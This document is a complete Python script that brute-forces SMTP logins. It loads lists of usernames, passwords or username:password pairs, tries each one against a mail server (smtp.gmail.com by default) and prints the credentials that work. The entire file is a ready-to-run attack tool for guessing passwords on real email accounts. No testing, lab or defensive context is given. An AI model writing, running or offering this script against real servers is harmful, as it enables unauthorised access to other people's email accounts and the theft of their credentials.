#!/usr/bin/env python
import smtplib


class SmtpBruteForce():
    def __init__(self, host, port):
        self.accounts = []
        self.passwords = []
        # Username:password combinations
        self.user_pass = []
        self.host = host
        self.port = port
        self.init_smtplib()

    def get_acc_list(self, path):
        with open(path) as f:
            for line in f:
                self.accounts.append(line.rstrip())

    def get_pass_list(self, path):
        with open(path) as f:
            for line in f:
                self.passwords.append(line.rstrip())

    def get_user_pass_list(self, path):
        with open(path) as f:
            for line in f:
                line = line.rstrip()
                self.user_pass.append(line.split(':'))

    def init_smtplib(self):
        self.smtp = smtplib.SMTP(self.host, self.port)
        if self.port != 25:
            self.smtp.starttls()
        self.smtp.ehlo()

    def try_one(self, user, password):
        try:
            self.smtp.login(user, password)
            print(f"\033[1;37mgood -> {user} -> {password} \033[1;m")
            self.smtp.quit()
            self.init_smtplib()
        except smtplib.SMTPAuthenticationError as e:
            print(e)
            print(f"\033[1;31msorry -> {user} -> {password} \033[1;m")

    def run(self):
        for user, password in self.user_pass:
            self.try_one(user, password)
        for user in self.accounts:
            for password in self.passwords:
                self.try_one(user, password)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-H", "--host", default="smtp.gmail.com")
    parser.add_argument("-p", "--port", default=587)
    parser.add_argument("-L", "--logins", help="Usernames")
    parser.add_argument("-P", "--passwords", help="Passwords")
    parser.add_argument("-C", "--user-pass", help="username:password list")
    args = parser.parse_args()
    brute = SmtpBruteForce(args.host, args.port)
    if args.logins:
        brute.get_acc_list(args.logins)
    if args.passwords:
        brute.get_pass_list(args.passwords)
    if args.user_pass:
        brute.get_user_pass_list(args.user_pass)
    brute.run()
